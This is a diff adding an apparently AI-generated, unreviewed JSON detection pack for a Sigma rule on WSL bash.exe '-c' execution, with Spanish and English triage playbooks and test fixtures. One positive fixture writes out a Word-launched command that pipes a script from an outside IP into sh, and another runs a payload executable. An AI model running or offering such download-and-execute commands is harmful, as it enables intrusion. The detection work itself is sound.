@@ -1,0 +1,126 @@
+{
+  "rule": {
+    "id": "5edc2273-c26f-406c-83f3-f4d948e740dd",
+    "title": "Indirect Inline Command Execution Via Bash.EXE",
+    "level": "medium",
+    "status": "test",
+    "author": "frack113",
+    "path": "windows/process_creation/proc_creation_win_bash_command_execution.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_bash_command_execution.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1202"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó el lanzador bash.exe de Microsoft (WSL) con el parámetro \" -c \", que ejecuta en línea un comando de Linux o de Windows. Esto puede servir para ejecutar binarios de forma indirecta y evadir controles.",
+      "what_it_detects": "Creación de procesos en Windows donde Image termina en \\Windows\\System32\\bash.exe o \\Windows\\SysWOW64\\bash.exe, o donde OriginalFileName es Bash.exe, y CommandLine contiene \" -c \".",
+      "why_it_matters": "bash.exe es un binario LOLBAS firmado por Microsoft. Con -c puede lanzar comandos o ejecutables a través del subsistema WSL, lo que oculta el proceso real a controles enfocados en el árbol de procesos de Windows (T1202, ejecución indirecta de comandos).",
+      "triage_steps": [
+        "Lea el CommandLine completo: identifique el comando que va después de -c, las URLs, el uso de curl/wget, base64, shells inversas o binarios .exe invocados desde /mnt/c.",
+        "Revise ParentImage y la línea de comandos del padre: una terminal de desarrollo o VS Code es esperable; Office, wscript, mshta o un servicio es sospechoso.",
+        "Verifique que el usuario normalmente use WSL y que el host tenga WSL instalado y autorizado según el inventario.",
+        "Revise los procesos hijos y los procesos de WSL (wsl.exe, wslhost.exe) en el mismo host dentro de +/- 15 minutos.",
+        "Busque conexiones de red, archivos creados en %TEMP% o en el sistema de archivos de WSL y cambios de persistencia en esa misma ventana de tiempo.",
+        "Consulte alertas anteriores del mismo host y usuario, y busque el mismo CommandLine en otros endpoints."
+      ],
+      "false_positives": [
+        "Desarrolladores o administradores que ejecutan scripts mediante bash -c desde herramientas de compilación, IDE o tareas de automatización.",
+        "Herramientas de instalación o de CI que configuran entornos WSL con comandos en línea."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o con el responsable del sistema si la ejecución fue legítima y documente la justificación.",
+        "Si es malicioso, aísle el endpoint, conserve los artefactos (CommandLine, scripts, distribución de WSL) y termine los procesos relacionados.",
+        "Elimine la persistencia y los archivos descargados, rote las credenciales expuestas y bloquee los indicadores de red encontrados.",
+        "Evalúe deshabilitar o restringir WSL mediante políticas en los equipos que no lo necesitan."
+      ],
+      "severity_rationale": "La severidad es media porque bash -c es un uso legítimo frecuente en equipos de desarrollo, aunque también es una técnica conocida de ejecución indirecta para evadir defensas."
+    },
+    "en": {
+      "summary": "Microsoft's bash.exe launcher (WSL) ran with the \" -c \" flag, which executes an inline Linux or Windows command. This can run binaries indirectly and bypass defenses.",
+      "what_it_detects": "Windows process creation where Image ends with \\Windows\\System32\\bash.exe or \\Windows\\SysWOW64\\bash.exe, or OriginalFileName is Bash.exe, and CommandLine contains \" -c \".",
+      "why_it_matters": "bash.exe is a Microsoft-signed LOLBAS binary. With -c it can launch commands or executables through WSL, which hides the real activity from controls that watch the Windows process tree (T1202, Indirect Command Execution).",
+      "triage_steps": [
+        "Read the full CommandLine: identify the command after -c, URLs, curl/wget, base64, reverse shells or .exe files invoked from /mnt/c.",
+        "Check ParentImage and its command line: a developer terminal or VS Code is expected; Office, wscript, mshta or a service is suspicious.",
+        "Confirm the user normally uses WSL and that WSL is installed and approved on the host per inventory.",
+        "Review child processes and WSL processes (wsl.exe, wslhost.exe) on the same host within +/- 15 minutes.",
+        "Look for network connections, files written to %TEMP% or the WSL filesystem, and persistence changes in the same time window.",
+        "Check earlier alerts for the same host and user, and search for the same CommandLine on other endpoints."
+      ],
+      "false_positives": [
+        "Developers or admins running scripts via bash -c from build tools, IDEs or automation tasks.",
+        "Installers or CI tooling that configure WSL environments with inline commands."
+      ],
+      "response_steps": [
+        "Confirm with the user or system owner whether the execution was legitimate and record the justification.",
+        "If malicious, isolate the endpoint, preserve artifacts (CommandLine, scripts, WSL distribution) and terminate related processes.",
+        "Remove persistence and downloaded files, rotate exposed credentials and block network indicators found.",
+        "Consider disabling or restricting WSL by policy on machines that do not need it."
+      ],
+      "severity_rationale": "Medium fits because bash -c is common on developer machines, yet it is also a known indirect-execution technique for defense evasion."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "bash.exe launched by Word with an inline command that downloads and runs a script",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\bash.exe",
+          "OriginalFileName": "Bash.exe",
+          "CommandLine": "bash.exe -c \"curl -s http://203.0.113.10/a.sh | sh\"",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+        }
+      },
+      {
+        "description": "Renamed bash binary identified by OriginalFileName running a Windows executable via -c",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0187",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Users\\mrojas\\AppData\\Local\\Temp\\svc.exe",
+          "OriginalFileName": "Bash.exe",
+          "CommandLine": "svc.exe -c /mnt/c/Users/Public/payload.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Interactive bash.exe session without the -c flag",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\bash.exe",
+          "OriginalFileName": "Bash.exe",
+          "CommandLine": "bash.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe"
+        }
+      },
+      {
+        "description": "Git for Windows bash with -c, not the Microsoft launcher",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0201",
+          "User": "ANDES\\lgomez",
+          "Image": "C:\\Program Files\\Git\\bin\\bash.exe",
+          "OriginalFileName": "bash.exe.mingw",
+          "CommandLine": "\"C:\\Program Files\\Git\\bin\\bash.exe\" -c \"git status\"",
+          "ParentImage": "C:\\Program Files\\Microsoft VS Code\\Code.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
